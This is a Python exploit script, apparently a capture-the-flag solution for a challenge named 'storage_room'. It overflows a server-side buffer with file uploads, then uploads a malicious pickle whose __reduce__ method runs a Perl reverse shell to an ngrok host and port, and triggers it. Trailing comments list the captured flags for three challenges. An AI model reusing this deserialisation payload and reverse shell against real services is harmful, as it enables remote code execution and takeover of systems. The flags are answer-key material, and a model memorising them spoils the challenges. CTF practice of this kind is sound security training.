#!/usr/bin/env python3

import requests
import pickle, base64
import pickletools
import random

class test:
	def __reduce__(self):
		import os
		cmd = "perl -e 'use Socket;$i=\"2.tcp.eu.ngrok.io\";$p=10873;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
		return os.system, (cmd,)


def main():
	username = idgen(5)
	password = "123"
	print("{}:{}".format(username, password))

	host = "https://storage_room.knping.pl/"
	s = requests.Session()
	resp = s.post( host + "/authentication", data = {
		'username':username,
		'password':password
	} )										# register

	begin = "Welcome to your buffer!"
	max_buff_size = 0xffff
	file_size = 0xdd
	k = (max_buff_size - len(begin))//file_size
	for _ in range(k):
		resp = s.post( host + "/files", files = {
			'file': "a" * file_size
		} )

	ending_size = max_buff_size - len(begin) - file_size * k
	resp = s.post( host + "/files", files = {
			'file': "a" * ending_size
		} )									# buffer_over_flow

	payload = pickle.dumps(test(), protocol=5)
	resp = s.post( host + "/files", files = {
			'file': payload[:130]
		} )
	resp = s.post( host + "/files", files = {
			'file': payload[130:]
		} )									# sending payload

	resp = s.get( host + "/chain" )			# executing payload


def idgen( size = 8 ):
	alph = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'
	return ''.join( random.choice( alph ) for _ in range( size ) )


if __name__ == "__main__":
	main()


# pwn		storage_room	ping{c0ngr4tz_0n_y0ur_buff3r_0v3r_fl0w!_8371018842d3dca63c034}
# rev		baby rev 		ping{r3v3rs1ng_c4n_b3_S0_muCH_FUN!!!}
# crypto	dialog			ping{B451c5_0f_3ncrypt10n_t00_345y?-K3y_r3tr13v3d!}